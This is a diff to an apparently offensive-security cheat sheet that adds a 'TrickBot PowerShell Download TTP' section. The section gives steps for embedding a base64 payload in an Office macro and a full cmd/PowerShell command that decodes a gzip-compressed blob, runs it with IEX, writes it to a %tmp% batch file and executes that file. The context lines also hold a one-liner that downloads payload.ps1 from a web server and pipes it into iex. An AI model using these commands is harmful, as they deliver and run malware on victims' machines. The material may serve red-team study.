@@ -18,6 +18,18 @@
 
 ```powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw orkCredentials;iwr('http://webserver/payload.ps1')|iex"```
 
+## TrickBot PowerShell Download TTP:
+
+1. Insert base64 string for malicious web server
+2. Select filename for output in %tmp% directory
+3. Attach to Office macro
+
+```
+cmd.exe /c powershell "'powershell ""$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''... Base64 string ...''));
+IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+'""| out-file -filepath %tmp%\tmp9388.bat -encoding ascii; cmd /c '%tmp%\tmp9388.bat'
+```
+
 # Living off the Land:
 
 ## Cscript/Wscript:
